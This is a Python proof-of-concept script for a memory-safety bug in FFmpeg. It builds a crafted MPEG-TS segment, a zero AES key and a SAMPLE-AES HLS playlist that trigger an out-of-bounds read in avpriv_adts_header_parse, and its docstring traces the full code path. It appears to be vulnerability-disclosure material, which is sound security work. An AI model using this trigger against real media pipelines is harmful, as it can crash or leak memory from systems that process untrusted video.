#!/usr/bin/env python3
"""
PoC for VULN 001: avpriv_adts_header_parse OOB read

Trigger path:
  ffmpeg -i vuln_001_input.m3u8 -f null -
  -> HLS demuxer detects SAMPLE-AES key in M3U8
  -> For each AAC packet: ff_hls_senc_decrypt_frame(AV_CODEC_ID_AAC, ...)
  -> decrypt_audio_frame() -> get_next_adts_frame()
  -> avpriv_adts_header_parse(&hdr, frame->data, ctx->buf_end - frame->data)
     [size = 7 passes the check >= AV_AAC_ADTS_HEADER_SIZE]
  -> ff_adts_header_parse_buf(buf, *phdr)  [BUG: buf not padded to 71 bytes]
  -> init_get_bits8(&gb, buf, 7) + first get_bits call uses AV_RB64(buf)
  -> reads 8 bytes from a 7-byte declared buffer -> OOB read

Root cause: avpriv_adts_header_parse only checks size >= 7, but passes
the raw caller buffer to ff_adts_header_parse_buf which requires
AV_AAC_ADTS_HEADER_SIZE + AV_INPUT_BUFFER_PADDING_SIZE = 71 bytes.
Compare with av_adts_header_parse (the public API) which correctly copies
to a local tmpbuf[71] before calling ff_adts_header_parse_buf.
"""

import struct
import os
import sys

OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))


def crc32_mpeg(data):
    """MPEG-2 CRC32 (polynomial 0x04C11DB7, init 0xFFFFFFFF, no final XOR)"""
    crc = 0xFFFFFFFF
    for byte in data:
        crc ^= (byte << 24)
        for _ in range(8):
            if crc & 0x80000000:
                crc = (crc << 1) ^ 0x04C11DB7
            else:
                crc <<= 1
            crc &= 0xFFFFFFFF
    return crc


def make_pat_section():
    """PAT: transport_stream_id=1, program 1 -> PMT PID=0x100"""
    # Body (after table_id + 2-byte syntax+length field):
    body = struct.pack('>H', 1)            # transport_stream_id = 1
    body += bytes([0xC1, 0x00, 0x00])     # version=0, current=1, sec#=0, last#=0
    # Program entry: program_number=1, PMT_PID=0x100
    body += struct.pack('>H', 0x0001)     # program_number = 1
    body += struct.pack('>H', 0xE100)     # reserved=0b111, PMT_PID = 0x100

    # section_length = len(body) + 4 (CRC)
    sec_len = len(body) + 4   # = 9 + 4 = 13
    header = bytes([0x00, 0xB0, sec_len])  # table_id=0x00, syntax+length
    section = header + body
    crc = crc32_mpeg(section)
    return section + struct.pack('>I', crc)


def make_pmt_section():
    """PMT: program 1, PCR_PID=0x101, AAC ADTS stream at PID=0x101"""
    body = struct.pack('>H', 0x0001)     # program_number = 1
    body += bytes([0xC1, 0x00, 0x00])   # version=0, current=1, sec#=0, last#=0
    body += struct.pack('>H', 0xE101)   # reserved=0b111, PCR_PID = 0x101
    body += struct.pack('>H', 0xF000)   # reserved=0b1111, program_info_length = 0
    # Elementary stream: type=0x0F (ISO/IEC 13818-7 Audio with ADTS, i.e. AAC), PID=0x101
    body += bytes([0x0F])               # stream_type = 0x0F
    body += struct.pack('>H', 0xE101)  # reserved=0b111, elementary_PID = 0x101
    body += struct.pack('>H', 0xF000)  # reserved=0b1111, ES_info_length = 0

    # section_length = len(body) + 4 (CRC) = 14 + 4 = 18
    sec_len = len(body) + 4
    header = bytes([0x02, 0xB0, sec_len])  # table_id=0x02 (PMT), syntax+length
    section = header + body
    crc = crc32_mpeg(section)
    return section + struct.pack('>I', crc)


def make_ts_packet(pid, data, pusi=False, cc=0):
    """Pack data into a 188-byte TS packet (with adaptation field stuffing)"""
    space = 184 - len(data)
    if space < 0:
        raise ValueError(f"Payload too large: {len(data)} > 184 bytes")

    if space == 0:
        afc = 0x10  # payload only
        af = b''
    elif space == 1:
        # Minimal 1-byte adaptation field (length=0, no content)
        afc = 0x30  # both adaptation field and payload
        af = bytes([0x00])
    else:
        afc = 0x30  # both adaptation field and payload
        # AF: 1 byte length + 1 byte flags + (space-2) stuffing bytes
        af_content = space - 2  # bytes after flags (stuffing with 0xFF)
        af = bytes([space - 1, 0x00]) + bytes([0xFF] * af_content)

    b0 = 0x47
    b1 = (0x40 if pusi else 0x00) | ((pid >> 8) & 0x1F)
    b2 = pid & 0xFF
    b3 = afc | (cc & 0x0F)

    pkt = bytes([b0, b1, b2, b3]) + af + data
    assert len(pkt) == 188, f"TS packet length {len(pkt)} != 188"
    return pkt


def make_pes_audio(payload, pts_val=0):
    """Create a PES packet for an audio stream (stream_id=0xC0)"""
    # PTS field (5 bytes encoding)
    pts_bytes = bytes([
        0x21 | ((pts_val >> 29) & 0x0E),   # '0010' + PTS[32:30] + marker_bit
        (pts_val >> 22) & 0xFF,              # PTS[29:22]
        0x01 | ((pts_val >> 14) & 0xFE),    # PTS[21:15] + marker_bit
        (pts_val >> 7) & 0xFF,              # PTS[14:7]
        0x01 | ((pts_val << 1) & 0xFE),    # PTS[6:0] + marker_bit
    ])

    # PES optional header: 3 bytes + 5 bytes PTS = 8 bytes
    opt = bytes([
        0x80,  # marker=10, scrambling=00, priority=0, align=0, copyright=0, copy=0
        0x80,  # PTS_DTS_flags=10 (PTS present, no DTS), rest=0
        0x05,  # PES_header_data_length = 5 (for PTS only)
    ]) + pts_bytes

    # PES packet_length = opt + payload (everything after 6-byte fixed PES header)
    pes_packet_length = len(opt) + len(payload)  # = 8 + 7 = 15

    # Full PES: 4-byte start (0x000001 + stream_id) + 2-byte length + optional + payload
    pes = bytes([0x00, 0x00, 0x01, 0xC0]) + struct.pack('>H', pes_packet_length) + opt + payload
    return pes


# ============================================================
# Build crafted ADTS header (7 bytes = AV_AAC_ADTS_HEADER_SIZE)
# ============================================================
# Layout (56 bits total):
#   sync(12)=0xFFF  ID(1)=0  Layer(2)=00  protection_absent(1)=1
#   profile(2)=01   sr_index(4)=0011  private(1)=0  chan_cfg(3)=001
#   original(1)=0   home(1)=0  copyright_id_bit(1)=0  copyright_id_start(1)=0
#   frame_length(13)=0000000000111 [= 7, minimum = AV_AAC_ADTS_HEADER_SIZE]
#   buffer_fullness(11)=11111111111 [= 0x7FF, VBR]
#   num_raw_blocks(2)=00 [= 0, meaning 1 AAC block]
#
# Result: 0xFF 0xF1 0x4C 0x40 0x00 0xFF 0xFC
#
# This header will pass the ADTS sync check and all validity checks:
#   - sample_rate = ff_mpeg4audio_sample_rates[3] = 48000 != 0 (valid)
#   - frame_length = 7 >= AV_AAC_ADTS_HEADER_SIZE = 7 (valid)
#   - protection_absent = 1 -> header_length = 7 (no CRC)
#
# In get_next_adts_frame(), after avpriv_adts_header_parse returns:
#   frame.length = 7, frame.header_length = 7
#   Check: frame.length > ctx.buf_end - frame.data -> 7 > 7 is FALSE -> OK
#   Check: frame.length - frame.header_length > 31 -> 0 > 31 is FALSE -> no decrypt
#   ctx.buf_ptr += frame.length -> advances past the 7-byte frame

ADTS_HEADER = bytes([0xFF, 0xF1, 0x4C, 0x40, 0x00, 0xFF, 0xFC])


# ============================================================
# Build MPEG-TS file
# ============================================================

# PAT packet (PID=0x0000, PUSI=1): defines program 1 with PMT at PID 0x100
pat_section = make_pat_section()
pat_payload = bytes([0x00]) + pat_section  # pointer_field=0 (required for PSI sections)
pat_pkt = make_ts_packet(0x0000, pat_payload, pusi=True, cc=0)

# PMT packet (PID=0x0100, PUSI=1): defines AAC audio stream at PID 0x101
pmt_section = make_pmt_section()
pmt_payload = bytes([0x00]) + pmt_section
pmt_pkt = make_ts_packet(0x0100, pmt_payload, pusi=True, cc=0)

# Audio PES packet (PID=0x0101, PUSI=1):
# PES wraps exactly 7 bytes of ADTS data (one "frame" = just the header, no payload).
# When decrypt_audio_frame() processes this packet:
#   ctx.buf_ptr = pkt->data (pointing to ADTS_HEADER[0])
#   ctx.buf_end = pkt->data + pkt->size = pkt->data + 7
#   get_next_adts_frame finds sync at offset 0
#   avpriv_adts_header_parse(hdr, buf, 7) is called
#   -> ff_adts_header_parse_buf(buf, hdr)  [BUG: buf only guaranteed 7 bytes]
#   -> init_get_bits8(&gb, buf, 7) + AV_RB64(buf) reads 8 bytes [OOB at buf[7]]
pes = make_pes_audio(ADTS_HEADER, pts_val=0)
audio_pkt = make_ts_packet(0x0101, pes, pusi=True, cc=0)

ts_data = pat_pkt + pmt_pkt + audio_pkt

ts_path = os.path.join(OUTPUT_DIR, "segment.ts")
with open(ts_path, "wb") as f:
    f.write(ts_data)
print(f"Wrote {ts_path} ({len(ts_data)} bytes)")


# ============================================================
# AES key file (16 bytes, all zeros)
# ============================================================
key_path = os.path.join(OUTPUT_DIR, "poc_key.bin")
with open(key_path, "wb") as f:
    f.write(bytes(16))
print(f"Wrote {key_path}")


# ============================================================
# HLS M3U8 playlist with SAMPLE-AES encryption
# ============================================================
# The SAMPLE-AES key type (not AES-128) triggers hls_sample_encryption.c path.
# AES-128 would encrypt the whole TS segment (different code path).
# SAMPLE-AES triggers ff_hls_senc_decrypt_frame() for each decoded packet.
m3u8_content = """\
#EXTM3U
#EXT-X-VERSION:3
#EXT-X-TARGETDURATION:10
#EXT-X-MEDIA-SEQUENCE:0
#EXT-X-KEY:METHOD=SAMPLE-AES,URI="poc_key.bin",IV=0x00000000000000000000000000000000
#EXTINF:10.0,
segment.ts
#EXT-X-ENDLIST
"""
m3u8_path = os.path.join(OUTPUT_DIR, "vuln_001_input.m3u8")
with open(m3u8_path, "w") as f:
    f.write(m3u8_content)
print(f"Wrote {m3u8_path}")

print("\nAll PoC files created.")
print(f"ADTS header bytes: {' '.join(f'{b:02X}' for b in ADTS_HEADER)}")
print(f"PAT section ({len(pat_section)} bytes), PMT section ({len(pmt_section)} bytes)")
print(f"PES ({len(pes)} bytes), TS file ({len(ts_data)} bytes = {len(ts_data)//188} packets)")
